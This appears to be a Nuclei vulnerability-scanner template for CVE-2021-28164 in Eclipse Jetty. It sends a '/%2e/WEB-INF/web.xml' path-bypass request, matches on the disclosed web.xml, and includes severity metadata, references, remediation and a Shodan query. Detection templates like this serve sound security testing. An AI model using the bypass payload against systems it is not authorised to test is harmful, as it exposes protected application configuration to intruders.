flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - '!contains_all(body, ''</web-app>'', ''java.sun.com'')'
    - '!contains_all(header, ''application/xml'')'
    - status_code != 200
    - status_code != 404
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/WEB-INF/web.xml'
- matchers:
  - condition: and
    dsl:
    - contains_all(body, '</web-app>', 'java.sun.com')
    - contains_all(header, 'application/xml')
    - status_code == 200
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/%2e/WEB-INF/web.xml'
id: CVE-2021-28164
info:
  author: noamrathaus
  classification:
    cpe: cpe:2.3:a:eclipse:jetty:9.4.37:20210219:*:*:*:*:*:*
    cve-id: CVE-2021-28164
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-200,NVD-CWE-Other
    epss-percentile: 0.99811
    epss-score: 0.93485
  description: 'Eclipse Jetty 9.4.37.v20210219 to 9.4.38.v20210224 is susceptible
    to improper authorization. The default compliance mode allows requests with URIs
    that contain %2e or %2e%2e segments to access protected resources within the WEB-INF
    directory. An attacker can access sensitive information regarding the implementation
    of a web application.

    '
  impact: 'An attacker can exploit this vulnerability to access sensitive information,
    potentially leading to further attacks or unauthorized access.

    '
  metadata:
    max-request: 2
    product: jetty
    shodan-query: cpe:"cpe:2.3:a:eclipse:jetty"
    vendor: eclipse
  name: Eclipse Jetty - Information Disclosure
  reference:
  - https://github.com/eclipse/jetty.project/security/advisories/GHSA-v7ff-8wcx-gmc5
  - https://github.com/vulhub/vulhub/tree/1239bca12c75630bb2033b728140ed5224dcc6d8/jetty
  - https://lists.apache.org/thread.html/r780c3c210a05c5bf7b4671303f46afc3fe56758e92864e1a5f0590d0@%3Cjira.kafka.apache.org%3E
  - http://packetstormsecurity.com/files/164590/Jetty-9.4.37.v20210219-Information-Disclosure.html
  - https://nvd.nist.gov/vuln/detail/cve-2021-28164
  remediation: 'Apply the latest security patches or updates provided by the Eclipse
    Jetty project to fix the information disclosure vulnerability.

    '
  severity: medium
  tags: cve2021,cve,packetstorm,vulhub,jetty,exposure,eclipse,vuln
